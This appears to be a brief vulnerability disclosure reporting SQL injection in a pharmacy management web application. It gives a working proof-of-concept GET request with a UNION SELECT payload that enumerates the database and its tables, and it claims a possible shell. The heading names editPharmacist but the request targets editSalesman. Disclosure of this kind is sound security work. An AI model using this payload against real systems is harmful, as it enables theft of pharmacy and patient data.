## editPharmacist

**Description of the vulnerability**
pharmacy_Management_System latest version has SQL injection via editPharmacist, which can get information about the database and even GetShell via SQL injection.



**Vulnerability recurrence**

![image-20240723142715784](https://github.com/user-attachments/assets/47b8c5fe-4fec-4ef9-a784-4d650be36ab5)

![image-20240723142737947](https://github.com/user-attachments/assets/0494658e-5793-42eb-85f6-6c57405720d5)

POC

```
GET /index.php?action=editSalesman&id=10}'+union+select+1,database(),(SELECT+GROUP_CONCAT(table_name)+FROM+information_schema.tables+WHERE+table_schema=database()),4,5,6,7,8+order+by+id+limit+0,1--+ HTTP/1.1
```

Result

![image-20240723142821268](https://github.com/user-attachments/assets/9d0df26d-e511-4810-b86e-e6972ffc1657)

